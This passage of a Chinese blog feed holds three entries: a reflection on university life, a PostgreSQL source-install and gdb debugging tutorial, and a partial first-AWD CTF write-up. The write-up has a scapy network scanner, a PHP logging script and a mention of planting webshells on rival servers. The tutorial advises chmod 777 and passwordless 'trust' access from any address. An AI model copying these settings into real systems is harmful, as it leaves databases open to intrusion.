rel="noopener">线性代数及其应用</a>,仅仅是多了应用2个字，讲解的东西居然相差甚大，学校教程疯狂推导，然后讲解例题，然后讲解大量类似例题的题，但是这本书确实非常接地气，比如第一章的练习就是逆序数解答了高矮排列问题。所以从线代开始，后面的离散，数据结构均买了偏应用的书。目前大二而言，本学期的专业课增加，额但是个人觉得确实课蛮水的，大二基本上只上了英语课和体育课绩点都3.5了，也让自己对学校课程略显失望，唯一可惜的就是pa没有好好做，可能因为自己没有把握住自己的情绪，现在想想因为自己的情绪而对某个想学的东西拒之门外真的太愚蠢了。不过依然如此，在大学，有了自己的追求，绩点一切随缘，不必刻意刷题提高绩点，但是会把握能提高绩点的机会。</p><h3 id="二、“问题不大”-永远保持一个积极向上的心态"><a href="#二、“问题不大”-永远保持一个积极向上的心态" class="headerlink" title="二、“问题不大”-永远保持一个积极向上的心态"></a>二、“问题不大”-永远保持一个积极向上的心态</h3><p>大学期间确实接触了形形色色的同学，有因为学习深夜痛哭深夜打电话求安慰的，有因为专业问题痛心疾首以泪洗面的朋友，也有因为社交而深夜在宿舍阳台思考人生的室友，当然也有失去英语期末考试资格，毛概考试睡过头但是一句话<code>问题不大</code>结尾的某位曹哲学家。我仿佛觉得自己的大学并未感受到什么挫折打击，或许有但是以及忘记了吧2333。人类的组成应该来说是差不多的，都是有七情六欲的，每个人都会有负面正面的心态，但是就是看你能展示出哪一面。曾经我也自信过自己的正能量值甚至能溢出，能安慰痛苦的，能和在阳台上的神仙触膝长谈的。但是有那么一周，身边突然多了很多悲观的同学，安慰她们的同时慢慢的那一周似乎自己也变得多愁善感，所以我开始坚信没有人是能没有一点负面情绪的，全部在于自己的控制。想想其实问题很简单，学习压力大的菜鸡自然有菜鸡的活法，专业不合适的，学自己想学的一部分就行了，社交障碍的想想怎么迈出去就完事了。问题肯定是有解决的时候，你解决不来还有别人，更别说轻生的神仙们。当你觉得很难得时候，说一句问题不大，可能真问题不大。<br>ps:有个小故事，今年六月份，王国彬学长带小菜鸡前往华科参加hackthon，现场组队，幸运自己被一个华科的学长带，这个学长自然也是写代码的，但是这个学长只有左手是能活动的！！！，当然我全程没询问任何关于这个的问题，但是这个学长给我留下了深深的印象，仅仅使用左手，先不说写汉字考语文如何写完，就算考入大学，多少人能一只手坚持学计算机，并且这位学长此刻正在RT-Thread公司实习，最深的印象就是这个学长全称是开心的，无论是写代码，还是帮我左手手手绘设计图，讲解进程间通信，能感受到嘴角的微笑是发自内心的，所以《当幸福来敲门》这样的故事不仅仅是在电影桥段中，真实也是存在的，当你接触到，你会震惊的！留下了比赛中的左手写的手稿<br><img src="1.jpg" alt=""></p><h3 id="三、学长学弟以及同学的交友之道"><a href="#三、学长学弟以及同学的交友之道" class="headerlink" title="三、学长学弟以及同学的交友之道"></a>三、学长学弟以及同学的交友之道</h3><p>大学这个平台我认为收获最大的自然是朋友圈，朋友圈=机会，当然并不是利用，而是能够互相援助。我认为自己大学最幸运的就是认识的人都很nice,大一开始非常幸运加入了odg组织，认识了阿汤哥赵神陆老板一些优秀的学长，之后开发接触的pm学长，再之后的打信安比赛接触的更多优秀的人。然后是比赛中接触的比如前面讲的华科学长。对于大学师兄弟我认为应该的状态：和任何人相处时都能从容淡定；遇到厉害的人可以谦恭地学习，不卑不亢，遇到不如自己的人，也能够平心静气地讲解，不颐指气使。但是我认为最重要的一点是<code>你一定要感谢任何曾经帮助过你，曾经传授过你知识，曾经给你提供过机会，曾经帮你解决过问题的任何人</code>，尊师重道我认识更多在于非义务上的帮助，你必须心怀感激，为人本质。回想两年，听过不少学长们培训，学长们的远程帮助，还有阿汤哥手把手的教写代码，也是需要铭记在心的。除了感激就是回到第二点，保持一个积极向上的心态对待其他人，在一个人难受的时候，你上去落井下石，这样的人天理难容。记得大二那年开学，大一在阳台上思考人生的神仙走过来说:”刘志赞啊，真的非常感谢那几个晚上你说的话，不然我真的撑不下去了”。就算是被认为是中央空调，又有何不可，你能收获到真挚的友谊，敞开心扉的圈子，甚至是单纯的恋爱，有谁不想在回宿舍路上遇见的认识的同学都能寒暄寒暄“呦，赞哥回来了”，而不是个个低头刷手机。</p><h3 id="四、我眼中的大学老师"><a href="#四、我眼中的大学老师" class="headerlink" title="四、我眼中的大学老师"></a>四、我眼中的大学老师</h3><p>大学两年，接触的比较深刻的大概来说有3个，体现出各自的为师的特点<br>一、<code>薛某A老师</code>:A老师是大一时候的软件工程导论的老师，接触的原因是是大一寒假的一个项目，这个项目是大学自已第一次做的项目，也是比较难受的一个项目，参与的成员几乎都是混一个项目实习证明的大三大四学长们，在参与一周后发现就自己的进度超过了他们之和，所以毅然离开了项目组，A老师的特点在于无法尝试新的东西过于保守刻板，比如只允许使用ecplice而不能使用idea开发，只能通过代码物理拷贝，而不参用git项目管理，另外给的学生待遇一个月兼职勉勉强强四位数，其实对于大学大部分老师的项目来说，兼职做项目这个待遇也是差不多吧。<br>二、<code>周某老师</code>：虽然和周老师发生的一些事情不是很愉快，但是这个老师确实是我很钦佩的。和周老师接触是因为他的一门课是我大学期间目前最认真的一门课，从未翘课，并且每堂课全程智商在线跟上节奏，他的课分理论课和实践课，理论课的言行确实有一种当代大师的风范，我个人很钦佩，所以能上好一堂完美的课，也是一个优秀的老师的体现，不愉快的是他的实践课是要求写一个网站，因为接触过，并且非常感兴趣，所以花了相对来说比较多的时间整课设，并且老早就到办公室申请答辩评优也受到了他的赞赏，但是到了助教打分时，给了我70分理由是“物极必反”-太过优秀严谨的项目和文档，透露出课设的真实性，我被怀疑是抄的，wtf我都对于这个学长我也是佛了，我都参与了评优答辩说明了整个项目框架结构甚至是所有技术，就算未答辩他又有何证据认为是抄的而直接暗箱操作，之后自己发了封邮件给老师，最后老师的决定是承认是我自己写的，但是分数不能改，唯一的解决方案是我来年重修，他给我打高分。我送出一句话：我有自己的追求而不是绩点，结束了这场闹剧。所以一个优秀的老师还需要具备对助教人才的选区，以及相关制度的完善或者说是否站在学生的角度思考过问题</p><p>三、<code>刘亮老师</code>：这里为什么能直接写名字呢，因为我想吹爆亮哥，亮哥年轻有干劲，首先我认为老师在项目的活跃性和他自己对于项目的贡献会直接决定整个项目的发展进程，确实能感觉得到，如果我成为一个老师，也想成为这样得，标准大概是这么几点；<br>1、合理处理师生关系:项目开会中保持严谨实事求是得态度，但是开会结束开车请项目组撸串出烧烤喝酒，甚至直接买入食材在办公室整饭吃。甚至是多我们学生说“你们如果有驾照了，我的车给你们开开”<br>2、价值观:我认为能够温饱甚至小康确实没必要那么在意钱，在和亮哥的项目开发中，似乎能感觉得到他关心得更多是项目得技术水平，对于待遇可以说是项目经费与学生AA的，这点是很现实的，多少学生参与传说中的百万级项目并且提供了不可小觑的输出，最后拿了几千的工资（某王真实故事）<br>3、胸怀: 亮哥在吃饭的时候问的一个问题是，你身边有没有家里比较贫穷的学生，他就是想在自己小康解决之后想资助其他学生能够在大学多学一点技术东西，而不是寒暑假发传单端盘子（此处并没有任何看不起底层劳动者的意思，只是认为合适的年龄应该做更有价值的事）。为师者能达到这等胸襟吹爆<br>4、传道的艺术：当然作为一个老师也还是需要学生管理，知识能力传授的，亮哥在功课上确实无门槛，比如他的研究生项目组讨论技术问题，对我们都是欢迎旁听的，亮哥的操作系统不少其他专同学跨专业选他的课以及能体现传道的魅力。</p><h3 id="五、一个组织应该具备什么"><a href="#五、一个组织应该具备什么" class="headerlink" title="五、一个组织应该具备什么"></a>五、一个组织应该具备什么</h3><p>大学两年前后，先后加入或者成立了一些组织，战队，部门什么的，总的来说就是一个team,一个team的管理人以及管理的制度会直接影响未来的发展。<br>先说说大一入学主要是odg和校科协的活动部，然后大二成立了一个假冒伪劣的odg（8086）,然后是信息安全战队，先后当了网络应用创新区部长，微软俱乐部技术主席。odg虽然现在时间凉得透顶，但是我认为是我大学期间或者人生极为重要的一个team，学会了如何管理一个team，所以总结来说我认为odg成功有以下几点<br>1、实干真知：既然我们是一个以技术为核心的team，所以缺少实货是绝对要凉的，odg在培训的时候全程是以一个能让萌新接受的，但是传授真知的状态，吹爆阿汤哥赵神<br>2、无阶级观念：虽然说大学是半个社会，但是毕竟不是整个，一个社团组织并不是严格按照每周要求的某一天大家恭恭敬敬坐在一个会议室，部长坐讲台开始讲事情地方<br>3、管理人员有责任感：责任感的体现就是说到做到，反面就是咕咕咕，作为一个team的leader，你的行为作风很容易会成为别人的标杆，所以leader需要有强烈的责任感（再次吹爆阿汤哥e’e<br>4、部员有归属感：第一次听到归属感一词来自于一个大一的优秀学弟，这个学弟在别的部门被邀请当部长都拒绝了，因为他想留任8086，因为他认为8086对他有归属感，当时他可能不知道8086其实不打算往下延续了，但是仅仅是这么一句话自己大二一年的努力没有白费，但是要做到这一点确实是很难的，能让部员有归属感，就回到了交友之道，比如说无培训时候阿汤哥能自掏腰包买零食聊天茶话会，如何能让部员们个个能在部门内打开心扉说出自己内心的真实感受可以认定为有归属感的体现</p><h3 id="六、大学恋爱价值观"><a href="#六、大学恋爱价值观" class="headerlink" title="六、大学恋爱价值观"></a>六、大学恋爱价值观</h3><p>我猜肯定有不少单身狗直接跳过了前面来这里看的，这里没啥好看的，看了您也找不到女朋友(‾◡◝)<br>严肃脸：某曹哲学家♂曾经对我说，人类本身就是“花心”的，没有只喜欢哪一个人，只有喜欢哪一类人<br>确实而言，就男孩子而言，大多数男孩子对于漂亮的定义不一样，但是对于自己觉得漂亮的女孩子一定会想去追求吧。曾经一个哲学家说过（这回是真的哲学家）</p><pre><code>一个人在世界上合适跟他在一起的有两万个人，你遇见这两万个人里的任何一个，也许都会发疯一样爱上她。可惜很多人一辈子都未必会碰见一个那样的人，也有的人运气更差，一下子碰见不止一个。</code></pre><p>先不说这个运气差的幸运儿，这个太复杂了，但是可以知道的是，在尚未接触之前，人类是没有非要和某个人在一起的依据。因为在爱之前，我坚信一定会有喜欢的这个过程，必不可少。爱一个人之后你才可以说这辈子没有她你不能活，那么这是如何过渡的呢，我认为喜欢可以是一个瞬间形成的，但是爱是需要时间的，日久生情不是没有道理的，所以我认为在你确定是不是喜欢一个女孩子的时候，你应该绅士大方可以邀请吃饭看电影，其实我个人认为单独吃饭看电影并不能说明什么，所以也希望大家能够提高自己的素养，看到某两个人走在一起就认为怎么怎么的，只有在几次真实交往中才能确定是不是真的合适在一起，如果你们相处一桌，互相紧张，互相压抑自己，只能让气氛更加僵硬，如果你们能越谈越开心，并且无太多拘束的开始慢慢说出自己的真实感受，那么你们已经成功了一半。如果你只是喜欢一个女孩子的时候，请不要做出这个阶段你不该做出的事说出的话，如果只是短暂的见几次面你就牵扯到爱不爱的，除非真的是一见钟情的爱（反正我认为是不存在的），开始送戒指这样的蠢事，因为这样可以认为你只是为了把你当前遇到的女孩用于占位来填充你自己内心的空虚，只会让你变得更恶心，虽然自己也曾经跟一些女孩子单独吃饭看电影，但是在过程中自己发现她确实不合适的时候，自己能够全身而退，全程始终是以一个同学或者朋友的角度。 当然肯定有很多男孩子由于种种原因不能说出，请你耐心等待，爱情是需要时间的，如果你们已经相处了很久，但是她在当前这个时间段在认真学习或者有不能分心的追求，你不能也不可以打扰她。你可以把喜欢放在心中，等她读书结束再询问感情的问题，切记</p><pre><code>如果你爱的人正在认真读书，请不要让她分心如果你不能肩负男朋友的责任，请不要妨碍她找男朋友当你不能给她足够的生活，请不要打扰她如果你不能为她披上嫁衣，就不要脱掉她的内衣</code></pre><p>当然，人的喜欢的标准必定不是一尘不变的，可能随着自己的年龄，心态的变化也在变，那么哪个选择才是你认为对的呢,张爱玲的话：</p><pre><code>也许每一个男子全都有过这样的两个女人，至少两个。娶了红玫瑰，久而久之，红的变了墙上的一抹蚊子血，白的还是床前明月光；娶了白玫瑰，白的便是衣服上沾的一粒饭黏子，红的却是心口上一颗朱砂痣。</code></pre><p>的确很真实，如果你是先遇到红玫瑰而后遇到白玫瑰那么恭喜你，你定会和白玫瑰走下去。如果你是先遇到白玫瑰，而后遇到红玫瑰，那么为您惋惜，当你回头看白玫瑰的时候可能已经物是人非，当然最好的解决是你的红玫瑰能够变成你的白玫瑰，如果您不知道什么是红玫瑰白玫瑰请自由谷歌百度或者看看张爱玲的书提高情商</p><h3 id="以上言论，均为自己有感而发，并不遵循任何标准，必定也有很多不妥，望见谅"><a href="#以上言论，均为自己有感而发，并不遵循任何标准，必定也有很多不妥，望见谅" class="headerlink" title="以上言论，均为自己有感而发，并不遵循任何标准，必定也有很多不妥，望见谅"></a>以上言论，均为自己有感而发，并不遵循任何标准，必定也有很多不妥，望见谅</h3>]]></content>
      
      
      <categories>
          
          <category> 总结人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大学前半生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>postgreSQL内核分析-源码安装和调试</title>
      <link href="/2019/06/24/postgresql-nei-he-fen-xi-yuan-ma-an-zhuang-he-diao-shi/"/>
      <url>/2019/06/24/postgresql-nei-he-fen-xi-yuan-ma-an-zhuang-he-diao-shi/</url>
      
        <content type="html"><![CDATA[<h3 id="一、环境配置"><a href="#一、环境配置" class="headerlink" title="一、环境配置"></a>一、环境配置</h3><pre><code>Ubuntu 16.04                        PostgreSql v11.3</code></pre><h3 id="二、源码下载解压"><a href="#二、源码下载解压" class="headerlink" title="二、源码下载解压"></a>二、源码下载解压</h3><p><a href="https://www.postgresql.org/ftp/source/" target="_blank" rel="noopener">https://www.postgresql.org/ftp/source/</a>,选择一个版本的,这里下载v11版本系列<br><img src="1.png" alt=""></p><a id="more"></a><h3 id="解压到指定目录-amp-amp-新建用户（非强制只是为了方便管理"><a href="#解压到指定目录-amp-amp-新建用户（非强制只是为了方便管理" class="headerlink" title="解压到指定目录&amp;&amp;新建用户（非强制只是为了方便管理"></a>解压到指定目录&amp;&amp;新建用户（非强制只是为了方便管理</h3><p>在/usr/local/下新建目录pgsql,记得<code>chmod -R 777 pgsql</code>否则后面打log会崩<br>然后将下载的压缩包丢到pgsql目录下解压</p><pre><code>tar zxvf postgresql-11.3.tar.gz</code></pre><p>解压后大概是这么些文件<br><img src="2.png" alt=""></p><h3 id="三、安装过程"><a href="#三、安装过程" class="headerlink" title="三、安装过程"></a>三、安装过程</h3><p>配置</p><pre><code>cd /usr/local/pgsql/./configure --prefix=/usr/local/pgsql --without-readline</code></pre><h4 id="坑1：error-readline-library-not-found"><a href="#坑1：error-readline-library-not-found" class="headerlink" title="坑1：error:readline library not found"></a>坑1：error:readline library not found</h4><p>解决办法<code>apt-get install libreadline-dev</code></p><h4 id="坑2：error-zlib-library-not-found"><a href="#坑2：error-zlib-library-not-found" class="headerlink" title="坑2：error: zlib library not found"></a>坑2：error: zlib library not found</h4><p>解决办法<code>apt-get install zlib1g</code><br><code>apt-get install zlib1g.dev</code><br>如果没有报错了,就可以去解压包里执行make了</p><pre><code>make</code></pre><p>如果不出意外大概需要一两分钟出现</p><pre><code>All of PostgreSQL successfully made. Ready to install.</code></pre><p>然后执行install</p><pre><code>make install</code></pre><p>出现</p><pre><code>PostgreSQL installation complete.</code></pre><p>安装完毕后应该在pgsql目录下会多一些<code>bin,include,lib</code>等文件夹<br><img src="3.png" alt=""></p><h3 id="四、配置用户环境"><a href="#四、配置用户环境" class="headerlink" title="四、配置用户环境"></a>四、配置用户环境</h3><p>据我的理解是一个用户的数据库数据放在一个文件夹里储存？不知道是不是这样<br>先增加一个用户使用数据库</p><pre><code>adduser postgres  //添加一个名为tommy的用户passwd postgres   //修改密码Changing password for user postgres.New UNIX password:     //在这里输入新密码Retype new UNIX password:  //再次输入新密码passwd: all authentication tokens updated successfully.</code></pre><p>然后转换到postgres用户下，在刚刚新建的pgsql文件夹下<code>mkdir data</code>，如果有啥权限问题，也<code>chmod -R 777 data/</code>就完事了<br>ps:将用户添加到sudoers中操作（防止出现postgres用户不能sudo</p><ol><li>首先切换到root用户</li><li>然后修改/etc/sudoers 权限 使其为可写</li></ol><pre><code>chmod u+w /etc/sudoersvi  /etc/sudoers</code></pre><p>然后在下面的</p><pre><code>root ALL=(ALL)  ALL</code></pre><p>这里增加自己需要的用户比如</p><pre><code>root ALL=(ALL)  ALLpostgres ALL=(ALL)  ALL</code></pre><p>最后一定要把权限修改回来：chmod u-w /etc/sudoers</p><h3 id="五、初始化和启动数据库"><a href="#五、初始化和启动数据库" class="headerlink" title="五、初始化和启动数据库"></a>五、初始化和启动数据库</h3><p>初始化</p><pre><code>su postgres/usr/local/pgsql/bin/initdb -D /usr/local/pgsql/data</code></pre><p>启动数据库</p><pre><code>./bin/pg_ctl start -D ./data/ -l logfile</code></pre><p>重启和关闭</p><pre><code>./bin/pg_ctl restart -D ./data/./bin/pg_ctl stop -D ./data/</code></pre><p><img src="4.png" alt=""><br>然后可以执行<br>./bin/psql进入命令行<br><img src="5.png" alt=""></p><h3 id="六、创建数据库和用户"><a href="#六、创建数据库和用户" class="headerlink" title="六、创建数据库和用户"></a>六、创建数据库和用户</h3><pre><code>执行  ./createdb kitty   创建kitty数据库执行  ./createuser -P postgres  创建postgres用户</code></pre><p>访问数据库后也可以用sql命令来新建用户</p><pre><code>create user postgres with password &#39;xxx&#39;;</code></pre><h3 id="七、配置远程访问"><a href="#七、配置远程访问" class="headerlink" title="七、配置远程访问"></a>七、配置远程访问</h3><p>1）修改配置文件pgsql/data/postgresql.conf</p><pre><code>vim /usr/local/pgsql/data/postgresql.conf</code></pre><p>修改监听地址：</p><pre><code>#listen_addresses=&#39;localhost&#39;#将上面这行改成如下listen_addresses=&#39;*&#39;</code></pre><p>2）修改配置文件/pgsql/data/pg_hba.conf：</p><pre><code>vim /usr/local/pgsql/data/pg_hba.conf</code></pre><p>添加一条IP授权记录，可以对一个网段授权</p><pre><code># IPv4 myhost connections:host    all         all         0.0.0.0/0          trust</code></pre><h3 id="八、使用pwngdb调试"><a href="#八、使用pwngdb调试" class="headerlink" title="八、使用pwngdb调试"></a>八、使用pwngdb调试</h3><p>首先查看postgres进程，有两个方法</p><h4 id="方法1：先查看客户端未连接后端的postgres进程"><a href="#方法1：先查看客户端未连接后端的postgres进程" class="headerlink" title="方法1：先查看客户端未连接后端的postgres进程"></a>方法1：先查看客户端未连接后端的postgres进程</h4><pre><code>ps -aux | grep postgres</code></pre><p><img src="6.png" alt=""><br>然后执行</p><pre><code>./psql -h 127.0.0.1 -d postgres</code></pre><p>再次查看进程<br><img src="7.png" alt="">,然后还是不确定</p><h4 id="方法2：在客户端交互界面查询后端进程ID"><a href="#方法2：在客户端交互界面查询后端进程ID" class="headerlink" title="方法2：在客户端交互界面查询后端进程ID"></a>方法2：在客户端交互界面查询后端进程ID</h4><p>使用<code>postgres=# select pg_backend_pid();</code><br><img src="8.png" alt=""><br>就能确定是30270了</p><h4 id="然后pwngdb出场"><a href="#然后pwngdb出场" class="headerlink" title="然后pwngdb出场"></a>然后pwngdb出场</h4><h4 id="8-1、设置gdb和屏蔽无用中断信号"><a href="#8-1、设置gdb和屏蔽无用中断信号" class="headerlink" title="8.1、设置gdb和屏蔽无用中断信号"></a>8.1、设置gdb和屏蔽无用中断信号</h4><pre><code>sudo gdb attach 4208pwndbg&gt;handle SIGUSR1 nostop passSignal        Stop    Print    Pass to program    DescriptionSIGUSR1       No    Yes    Yes        User defined signal 1</code></pre><h4 id="8-2、设置断点-随便设置，这里为了测试是打在计算结果处"><a href="#8-2、设置断点-随便设置，这里为了测试是打在计算结果处" class="headerlink" title="8.2、设置断点/随便设置，这里为了测试是打在计算结果处"></a>8.2、设置断点/随便设置，这里为了测试是打在计算结果处</h4><pre><code>pwndbg&gt; b ExecResultBreakpoint 1 at 0x6275f0</code></pre><h4 id="8-3、客户端发起查询"><a href="#8-3、客户端发起查询" class="headerlink" title="8.3、客户端发起查询"></a>8.3、客户端发起查询</h4><pre><code>postgres=# select 1+1;</code></pre><p>此刻应该被断点断住的</p><h4 id="8-4、调试"><a href="#8-4、调试" class="headerlink" title="8.4、调试"></a>8.4、调试</h4><pre><code>pwndbg&gt;c</code></pre><p><img src="9.png" alt=""><br>查看调用栈<br><img src="10.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> PostgreSql内核分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PostgreSql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>First_AWD</title>
      <link href="/2019/06/17/first-awd/"/>
      <url>/2019/06/17/first-awd/</url>
      
        <content type="html"><![CDATA[<h3 id="昨儿参加了金科awd，小菜鸡的第一次awd，记录一下过程呗。"><a href="#昨儿参加了金科awd，小菜鸡的第一次awd，记录一下过程呗。" class="headerlink" title="昨儿参加了金科awd，小菜鸡的第一次awd，记录一下过程呗。"></a>昨儿参加了金科awd，小菜鸡的第一次awd，记录一下过程呗。</h3><h4 id="一、现场感觉咋样？"><a href="#一、现场感觉咋样？" class="headerlink" title="一、现场感觉咋样？"></a>一、现场感觉咋样？</h4><p>现场有西瓜吃，然后吃了一下午瓜，┭┮﹏┭┮，先说说网络配置<br>按理说应该整一个网段扫描扫其他靶机的ip地址<br>但是比赛方大致提供了网络分布图<br>一共11只队伍,每只队伍4个人,一共三道题目（3个Web oRz oRz<br>第n只队伍的A,B,C,D选手的ip分别是<code>172.20.10n.1/2/3/4</code><br>第n只队伍的web1,web2,web3的ip分别是<code>172.20.10n.101/102/103</code><br>规则为每半小时一轮，开局一轮只能防不能打，主办方每5分钟随机check一次靶机，如果宕机扣除比攻击更多的分</p><a id="more"></a><p>当然一般应该不会直接告诉你其他队ip地址，自己扫一扫就行，保存在<code>ip_file.txt</code>中，不同网段修改IpScan的网段即可</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> scapy<span class="token punctuation">.</span>all <span class="token keyword">import</span> srp<span class="token punctuation">,</span> Ether<span class="token punctuation">,</span> ARP<span class="token keyword">import</span> reIpScan <span class="token operator">=</span> <span class="token string">'192.168.1.1/24'</span>ip_file<span class="token operator">=</span>open<span class="token punctuation">(</span><span class="token string">'ip_file.txt'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    ans<span class="token punctuation">,</span>unans <span class="token operator">=</span> srp<span class="token punctuation">(</span>Ether<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token string">"FF:FF:FF:FF:FF:FF"</span><span class="token punctuation">)</span><span class="token operator">/</span>ARP<span class="token punctuation">(</span>pdst<span class="token operator">=</span>IpScan<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> send<span class="token punctuation">,</span> rcv <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        ListMACAddr <span class="token operator">=</span> rcv<span class="token punctuation">.</span>sprintf<span class="token punctuation">(</span><span class="token string">"%Ether.src%---%ARP.psrc%"</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>ListMACAddr<span class="token punctuation">)</span>        Just_IP <span class="token operator">=</span> rcv<span class="token punctuation">.</span>sprintf<span class="token punctuation">(</span><span class="token string">"%ARP.psrc%\n"</span><span class="token punctuation">)</span>        ip_file<span class="token punctuation">.</span>write<span class="token punctuation">(</span>Just_IP<span class="token punctuation">)</span><span class="token punctuation">;</span>ip_file<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="1.png" alt=""><br>运维有点难受鸭，把不死马上了别个服务器，突然比赛停止分数和服务全部重置，尴尬！本次比赛三个flag都在各自服务器的根目录下，而且文件名是随机的，所以不仅要求有任意文件读能力，还得代码执行能力</p><h4 id="二、获得了ip地址首先做了啥？"><a href="#二、获得了ip地址首先做了啥？" class="headerlink" title="二、获得了ip地址首先做了啥？"></a>二、获得了ip地址首先做了啥？</h4><p>开始其实没必要紧张，因为不是一开始就能被打，先半小时自己fix自己的服务器</p><h5 id="1、登陆到ssh，修改密码"><a href="#1、登陆到ssh，修改密码" class="headerlink" title="1、登陆到ssh，修改密码"></a>1、登陆到ssh，修改密码</h5><p>本次比赛大家的服务器ip和自己的mac地址绑定了，比赛方提供的ssh密码都是默认的弱密码，一个是ctf一个是admin一个是123456，所以先上自己的服务区后修改自己的密码直接输入<code>passwd</code>,然后会让你先输入自己的旧密码，再输入两遍新密码。</p><h5 id="2、dump源码"><a href="#2、dump源码" class="headerlink" title="2、dump源码"></a>2、dump源码</h5><p>这个真滴重要，因为确实作为运维不行的小辣鸡（指自己，一不小心服务器就挂了，当然还有就是以防别的队拿了shell搞事情，很内疚，因为操作失误，不小心删了别个主页，听我解释o((&gt;ω&lt; ))o！。</p><h5 id="3、备份数据库"><a href="#3、备份数据库" class="headerlink" title="3、备份数据库"></a>3、备份数据库</h5><p>3个web有2个用了mysql，233，密码都是弱密码，所以找到配置文件查看mysql修改密码，最好是备份一份在自己本地<br>mysql修改密码</p><pre><code>格式：mysql&gt; set password for 用户名@localhost = password(&#39;新密码&#39;);  例子：mysql&gt; set password for root@localhost = password(&#39;123&#39;);  </code></pre><p>记得把服务里的代码也改一改</p><h5 id="4、先找一句话木马"><a href="#4、先找一句话木马" class="headerlink" title="4、先找一句话木马"></a>4、先找一句话木马</h5><p>先拿D盾扫一遍查杀比较简单的木马<a href="http://www.d99net.net/" target="_blank" rel="noopener">传送门</a><br>，当然这个只是基本的，如果没扫到，可以试试找一找隐藏的webshell,之前一篇博客的启发<a href="https://kit4y.github.io/2019/05/27/python3%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%AE%9E%E4%BE%8B%E4%B9%8B%E6%89%B9%E9%87%8F%E6%A3%80%E6%B5%8Bwebshell%E5%AD%98%E6%B4%BB%E5%B7%A5%E5%85%B7/#more">python3多线程实例之批量检测webshell存活工具</a>,最后面一个脚本需要你将源码放在本地，递归遍历每个文件，然后通过暴力测试能够找到隐藏的木马。</p><h5 id="5、监控脚本"><a href="#5、监控脚本" class="headerlink" title="5、监控脚本"></a>5、监控脚本</h5><p>由于第一打的小比赛，waf就没装了（说到底也没几个访问我们的服务器，嘤嘤嘤，上一个流量监控脚本</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">define</span><span class="token punctuation">(</span><span class="token string">'LOG_FILEDIR'</span><span class="token punctuation">,</span><span class="token string">'./logs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token constant">LOG_FILEDIR</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token shell-comment comment">#echo </span><span class="token string">"has "</span><span class="token punctuation">;</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token constant">LOG_FILEDIR</span><span class="token punctuation">,</span><span class="token number">0777</span><span class="token punctuation">,</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment"># echo </span><span class="token string">"Mkdir"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token string">'getallheaders'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">function</span> <span class="token function">getallheaders</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span> <span class="token keyword">as</span> <span class="token variable">$name</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">'HTTP_'</span><span class="token punctuation">)</span> <span class="token variable">$headers</span><span class="token punctuation">[</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token function">ucwords</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">return</span> <span class="token variable">$headers</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">;</span> <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">;</span> <span class="token variable">$cookie</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">;</span> <span class="token variable">$header</span> <span 